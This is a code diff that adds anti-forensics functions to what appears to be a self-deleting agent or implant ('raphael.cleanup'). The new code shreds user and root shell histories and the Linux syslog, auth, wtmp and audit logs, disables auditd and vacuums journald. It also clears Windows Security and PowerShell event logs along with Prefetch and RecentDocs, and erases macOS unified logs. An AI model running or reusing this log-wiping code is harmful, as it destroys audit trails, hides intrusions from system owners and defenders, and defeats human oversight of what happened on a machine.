@@ -6,10 +6,186 @@ import subprocess
 import sys
 import tempfile
 import time
+import logging
 from pathlib import Path
 
+logger = logging.getLogger("raphael.cleanup")
 
-def self_delete(agent_dir: str | Path, secure: bool = True) -> None:
+
+def wipe_system_logs() -> dict:
+    """
+    Wipe forensic traces from system logs and shell histories.
+    
+    Returns dict with wipe statistics.
+    """
+    system = platform.system()
+    
+    if system == "Linux":
+        return _wipe_linux_logs()
+    elif system == "Windows":
+        return _wipe_windows_logs()
+    elif system == "Darwin":
+        return _wipe_macos_logs()
+    
+    return {"wiped": 0, "failed": 0, "details": []}
+
+
+def _wipe_linux_logs() -> dict:
+    """Wipe Linux system logs and shell histories."""
+    results = {"wiped": 0, "failed": 0, "details": []}
+    home = os.path.expanduser("~")
+    
+    # Shell histories
+    for hist_file in [".bash_history", ".zsh_history", ".python_history",
+                      ".mysql_history", ".psql_history", ".node_repl_history"]:
+        path = Path(home) / hist_file
+        if path.exists():
+            try:
+                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
+                results["wiped"] += 1
+                results["details"].append(f"shred {path}")
+            except Exception:
+                results["failed"] += 1
+    
+    # Root shell history
+    for root_hist in ["/root/.bash_history", "/root/.zsh_history"]:
+        path = Path(root_hist)
+        if path.exists():
+            try:
+                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
+                results["wiped"] += 1
+                results["details"].append(f"shred {path}")
+            except Exception:
+                results["failed"] += 1
+    
+    # System logs (requires root)
+    if os.geteuid() == 0:
+        syslog_files = [
+            "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
+            "/var/log/kern.log", "/var/log/dmesg", "/var/log/btmp",
+            "/var/log/wtmp", "/var/log/lastlog", "/var/log/faillog",
+            "/var/log/maillog", "/var/log/cron", "/var/log/secure",
+        ]
+        for logfile in syslog_files:
+            path = Path(logfile)
+            if path.exists():
+                try:
+                    subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=10)
+                    results["wiped"] += 1
+                    results["details"].append(f"shred {path}")
+                except Exception:
+                    results["failed"] += 1
+        
+        # Journald
+        try:
+            subprocess.run(["journalctl", "--rotate"], capture_output=True, timeout=5)
+            subprocess.run(["journalctl", "--vacuum-time=1s"], capture_output=True, timeout=5)
+            results["wiped"] += 1
+            results["details"].append("journald vacuum")
+        except Exception:
+            results["failed"] += 1
+        
+        # Auditd
+        try:
+            subprocess.run(["auditctl", "-e", "0"], capture_output=True, timeout=5)
+            audit_log = Path("/var/log/audit/audit.log")
+            if audit_log.exists():
+                subprocess.run(["shred", "-zu", str(audit_log)], capture_output=True, timeout=10)
+                results["wiped"] += 1
+                results["details"].append("auditd disabled + log shred")
+        except Exception:
+            results["failed"] += 1
+    
+    # Clear in-memory bash history
+    try:
+        subprocess.run(["history", "-c"], shell=True, capture_output=True)
+        subprocess.run(["cat", "/dev/null", ">", os.path.join(home, ".bash_history")], 
+                      shell=True, capture_output=True)
+    except Exception:
+        pass
+    
+    return results
+
+
+def _wipe_windows_logs() -> dict:
+    """Wipe Windows Event Logs."""
+    results = {"wiped": 0, "failed": 0, "details": []}
+    
+    log_names = [
+        "Security", "System", "Application",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-WinRM/Operational",
+        "Microsoft-Windows-SMBClient/Connectivity",
+        "Microsoft-Windows-TaskScheduler/Operational",
+        "Windows PowerShell",
+        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+    ]
+    
+    for log_name in log_names:
+        try:
+            subprocess.run(
+                ["wevtutil.exe", "cl", log_name],
+                capture_output=True, timeout=10
+            )
+            results["wiped"] += 1
+            results["details"].append(f"wevtutil cl {log_name}")
+        except Exception:
+            results["failed"] += 1
+    
+    # Prefetch
+    prefetch_dir = Path(os.path.expandvars(r"%SystemRoot%\Prefetch"))
+    if prefetch_dir.exists():
+        for pf in prefetch_dir.glob("*.pf"):
+            try:
+                pf.unlink()
+                results["wiped"] += 1
+                results["details"].append(f"del prefetch {pf.name}")
+            except Exception:
+                results["failed"] += 1
+    
+    # RecentDocs
+    try:
+        subprocess.run(
+            ["reg", "delete", 
+             r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs", "/f"],
+            capture_output=True, timeout=5
+        )
+        results["wiped"] += 1
+        results["details"].append("RecentDocs cleared")
+    except Exception:
+        results["failed"] += 1
+    
+    return results
+
+
+def _wipe_macos_logs() -> dict:
+    """Wipe macOS logs."""
+    results = {"wiped": 0, "failed": 0, "details": []}
+    
+    home = os.path.expanduser("~")
+    for hist in [".bash_history", ".zsh_history", ".python_history"]:
+        path = Path(home) / hist
+        if path.exists():
+            try:
+                subprocess.run(["shred", "-zu", str(path)], capture_output=True, timeout=5)
+                results["wiped"] += 1
+                results["details"].append(f"shred {path}")
+            except Exception:
+                results["failed"] += 1
+    
+    # Unified logs (requires SIP disabled or root)
+    if os.geteuid() == 0:
+        try:
+            subprocess.run(["log", "erase", "--all"], capture_output=True, timeout=10)
+            results["wiped"] += 1
+            results["details"].append("log erase --all")
+        except Exception:
+            results["failed"] += 1
+    
+    return results
+
+
+def self_delete(agent_dir: str | Path, secure: bool = True, wipe_logs: bool = False) -> None:
     """
     Remove the agent directory tree with proper race-condition handling.
 
